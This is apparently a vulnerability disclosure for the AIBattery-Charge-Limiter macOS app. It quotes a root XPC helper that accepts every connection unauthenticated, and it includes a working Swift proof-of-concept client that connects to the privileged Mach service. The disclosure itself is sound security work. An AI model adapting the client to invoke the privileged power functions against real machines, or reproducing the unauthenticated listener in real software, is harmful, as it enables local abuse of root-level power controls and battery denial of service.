## Summary

A root privileged XPC helper registers a public Mach service (`com.collweb.AIBatteryHelper`) and accepts any incoming connection without authenticating the caller (no audit token, code-signing TeamID or entitlement checks).

As a result, any local, unprivileged process can invoke methods exposed via BatteryXPCProtocol (e.g., `forceBatteryMode`, `enableAdapter`, `enableCharging`) and perform privileged power/SMC operations.

## Technical Details

The vulnerable implementation is located in:

- [BatteryXPCService.swift](https://github.com/whuan132/AIBattery-Charge-Limiter/blob/main/AIBatteryHelper/XPC/BatteryXPCService.swift)

The privileged helper runs as root and registers a Mach service (`com.collweb.AIBatteryHelper`) using NSXPCListener. It then unconditionally accepts all incoming connections:

```swift
class ServiceDelegate: NSObject, NSXPCListenerDelegate {
    func listener(_: NSXPCListener, shouldAcceptNewConnection newConnection: NSXPCConnection) -> Bool {
        // Define the exported protocol
        newConnection.exportedInterface = NSXPCInterface(with: BatteryXPCProtocol.self)
        // Provide the implementation object
        newConnection.exportedObject = BatteryXPCService()
        newConnection.resume()
        return true
    }
}
```
No validation (such as auditToken or code signing) is performed.

The helper then exposes functions like:

```
func enableCharging(withReply reply: @escaping () -> Void)
func disableCharging(withReply reply: @escaping () -> Void)
func updateMagSafeLed(_ isChargingEnabled: Bool, withReply reply: @escaping () -> Void)
func forceBatteryMode(withReply reply: @escaping () -> Void)
func enableAdapter(withReply reply: @escaping () -> Void)
func getVersion(withReply reply: @escaping (String) -> Void)
```

## Proof of Concept

Create a client app (`exploit.swift`) that connects to the privileged helper and calls `getVersion` via XPC.

```swift
import Foundation

@objc protocol BatteryXPCProtocol {
    func getVersion(withReply reply: @escaping (String) -> Void)
}

// Replace with the exact MachServices key from the helper's launchd/XPC plist:
let serviceName = "com.collweb.AIBatteryHelper"

// Use .privileged ONLY if the helper runs as root (SMJobBless/LaunchDaemon).
let connection = NSXPCConnection(machServiceName: serviceName, options: .privileged)
// If it's a non-privileged helper, use:
// let connection = NSXPCConnection(machServiceName: serviceName, options: [])

connection.remoteObjectInterface = NSXPCInterface(with: BatteryXPCProtocol.self)

connection.invalidationHandler = {
    fputs("[!] XPC invalidated\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}
connection.interruptionHandler = {
    fputs("[!] XPC interrupted\n", stderr)
}

connection.resume()

guard let proxy = connection.remoteObjectProxyWithErrorHandler({ error in
    fputs("[!] XPC error: \(error)\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}) as? BatteryXPCProtocol else {
    fputs("[!] Could not obtain proxy\n", stderr)
    exit(1)
}

print("[*] Connected; calling getVersion…")

// Simple timeout so the PoC won't hang forever
let timer = DispatchSource.makeTimerSource()
timer.schedule(deadline: .now() + 5)
timer.setEventHandler {
    fputs("[!] Timeout after 5s without a reply\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}
timer.resume()

proxy.getVersion { version in
    print("[+] Helper version = \(version)")
    timer.cancel()
    CFRunLoopStop(CFRunLoopGetMain())
}

CFRunLoopRun()
connection.invalidate()
```

## Impact 

- Any local, unprivileged process can control system-level power management normally restricted to root,
- an attacker can force battery mode, prevent sleep, and drain the battery to shutdown, making the laptop unusable until recharged,
- power policy (e.g., sleep/adapter/charging state) can be changed for all users and may persist until manually reverted,
- repeated forced discharge/charge cycles and disabling charging can accelerate battery wear; abrupt power-state changes may cause thermal throttling and degraded performance,
- no user interaction required; no privileges required; low complexity.

This breaks macOS’s security boundary between user and system-level operations.







